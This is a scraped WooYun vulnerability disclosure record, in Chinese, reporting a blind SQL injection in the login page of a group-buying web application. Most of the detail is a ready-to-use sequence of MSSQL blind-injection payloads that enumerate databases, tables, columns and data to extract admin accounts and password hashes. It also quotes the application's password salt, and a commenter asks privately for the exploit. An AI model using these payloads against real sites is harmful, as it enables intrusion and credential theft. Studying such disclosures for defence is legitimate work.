{"id": 13345, "wybug_id": "wooyun-2013-019645", "wybug_title": "艾尚团购系统商业版2.291 登录处盲注漏洞", "wybug_corp": "艾尚团购", "wybug_author": "小痞子", "wybug_date": "2013-03-07 09:58", "wybug_open_date": "2013-04-21 09:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-04-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： http://test.asdht.com/login.aspx  这个页面登录的地方存在盲注 详细说明：  \n\n\n\n\n\n\n\n盲注常规步骤：判断库是否确实为MSSQL2005：' and substring((select @@version),22,4)='2005' ;--猜数据库名：先猜dbid：' and (select count(*) from master.dbo.sysdatabases where dbid=5)=1 ;--根据dbid猜库名，先猜出长度：' and (select count(*) from master.dbo.sysdatabases where dbid=5 and len(name)=12)=1 ;--再逐位猜：' and (select count(*) from master.dbo.sysdatabases where dbid=5 and ascii(substring(name,1,1))>90)=1 ;--猜表名（假设库名已经猜出为database）：可以尝试先看有没管理表：' and (select count(*) from database.dbo.sysobjects where xtype='u' and name like '%admin%')=1 ;--猜第一个，先长度：' and (select count(*) from database.dbo.sysobjects where name in (select top 1 name from database.dbo.sysobjects where xtype='u') and len(name)=9)=1 ;--猜第一个表名，逐位猜：' and (select count(*) from database.dbo.sysobjects where name in (select top 1 name from database.dbo.sysobjects where xtype='u') and ascii(substring(name,1,1))>90)=1 ;--猜第二个表名（假设第一个为table1）：' and (select count(*) from database.dbo.sysobjects where name in (select top 1 name from database.dbo.sysobjects where xtype='u' and name not in ('table1')) and ascii(substring(name,1,1))>90)=1 ;--...猜字段（假设表名已经猜出为table）：猜第一个字段：' and (select count(*) from database.dbo.syscolumns where name in (select top 1 name from database_db.dbo.syscolumns where id=object_id('database.dbo.table')) and ascii(substring(name,1,1))>90)=1 ;--猜第二个（假设第一个为column1）' and (select count(*) from database.dbo.syscolumns where name in (select top 1 name from database_db.dbo.syscolumns where id=object_id('database.dbo.table') and name not in ('column1')) and ascii(substring(name,1,1))>90)=1 ;--...猜数据（假设要猜的字段为name）：' and (select count(*) from database.dbo.table where name in (select top 1 name from database_db.dbo.table) and ascii(substring(name,1,1))>90)=1 ;--通过此方法可以爆出后台账户 以及 MD5密码。 但是后台MD5加密都是跟了后缀 比较难解密 FormsAuthentication.HashPasswordForStoringInConfigFile(pwd + \"@4!@#$%@\", \"md5\"))   漏洞证明：  \n\n   修复方案：  你懂的   版权声明：转载请注明来源 小痞子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-03-08 21:38 |    \t\t嘟嘟 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 这个人很懒，什么都没留下。)\t\t \n  赶紧的密我，让我玩玩    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}